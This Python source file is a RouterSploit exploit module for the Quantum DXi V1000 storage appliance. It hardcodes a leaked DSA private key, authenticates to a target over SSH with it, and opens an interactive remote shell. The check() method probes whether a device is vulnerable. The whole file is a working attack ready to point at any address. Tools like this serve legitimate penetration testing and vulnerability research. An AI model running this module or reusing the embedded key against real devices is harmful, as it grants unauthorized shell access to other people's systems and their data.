import paramiko, StringIO, termios, tty, sys, select, socket

from routersploit import (
    exploits,
    print_success,
    print_error,
)


class Exploit(exploits.Exploit):
    """
    Exploit implementation for private key exposure vulnerability.
    If the target is vulnerable it is possible to authenticate to the device"
    """
    __info__ = {
        'name': 'Quantum DXi V1000 Priv Key',
        'description': 'Module exploits private key exposure vulnerability. If the target is is possible to authentiate to the device.',
        'authors': [
            'xistence <xistence[at]0x90.nl>',  # vulnerability discovery
            'Marcin Bury <marcin.bury[at]reverse-shell.com>',  # routersploit module
        ],
        'references': [
            'https://packetstormsecurity.com/files/125755',
        ],
        'devices': [
            'Quantum DXi V1000',
        ],
    }

    target = exploits.Option('', 'Target address e.g. 192.168.1.1')  # target address
    private_key = """
    -----BEGIN DSA PRIVATE KEY-----
    MIIBugIBAAKBgQCEgBNwgF+IbMU8NHUXNIMfJ0ONa91ZI/TphuixnilkZqcuwur2
    hMbrqY8Yne+n3eGkuepQlBBKEZSd8xPd6qCvWnCOhBqhkBS7g2dH6jMkUl/opX/t
    Rw6P00crq2oIMafR4/SzKWVW6RQEzJtPnfV7O3i5miY7jLKMDZTn/DRXRwIVALB2
    +o4CRHpCG6IBqlD/2JW5HRQBAoGAaSzKOHYUnlpAoX7+ufViz37cUa1/x0fGDA/4
    6mt0eD7FTNoOnUNdfdZx7oLXVe7mjHjqjif0EVnmDPlGME9GYMdi6r4FUozQ33Y5
    PmUWPMd0phMRYutpihaExkjgl33AH7mp42qBfrHqZ2oi1HfkqCUoRmB6KkdkFosr
    E0apJ5cCgYBLEgYmr9XCSqjENFDVQPFELYKT7Zs9J87PjPS1AP0qF1OoRGZ5mefK
    6X/6VivPAUWmmmev/BuAs8M1HtfGeGGzMzDIiU/WZQ3bScLB1Ykrcjk7TOFD6xrn
    k/inYAp5l29hjidoAONcXoHmUAMYOKqn63Q2AsDpExVcmfj99/BlpQIUYS6Hs70u
    B3Upsx556K/iZPPnJZE=
    -----END DSA PRIVATE KEY-----
    """

    def run(self):
        pkey = paramiko.DSSKey.from_private_key(StringIO.StringIO(self.private_key))

        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        try:
            ssh.connect(self.target, 22, timeout=5, pkey=pkey)
        except:
            ssh.close()
            print_error("Device seems to be not vulnerable")
        else:
            print_success("SSH - Successful authentication")

            chan = ssh.invoke_shell()
            oldtty = termios.tcgetattr(sys.stdin)
            try:
                tty.setraw(sys.stdin.fileno())
                tty.setcbreak(sys.stdin.fileno())
                chan.settimeout(0.0)

                while(True):
                    r, w, e = select.select([chan, sys.stdin], [], [])
                    if(chan in r):
                        try:
                            x = unicode(chan.recv(1024))

                            if(len(x) == 0):
                                sys.stdout.write('\r\nExiting...\r\n')
                                break

                            sys.stdout.write(x)
                            sys.stdout.flush()

                        except socket.timeout:
                            pass

                    if(sys.stdin in r):
                        x = sys.stdin.read(1)

                        if(len(x) == 0):
                            break

                        chan.send(x)
            
            finally:
                termios.tcsetattr(sys.stdin, termios.TCSADRAIN, oldtty)
                return

    def check(self):
        pkey = paramiko.DSSKey.from_private_key(StringIO.StringIO(self.private_key))

        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        try:
            ssh.connect(self.target, 22, timeout=5, pkey=pkey)
        except:
            ssh.close()
        else:
            return True  # target is vulnerable

        return False  # target is not vulnerable
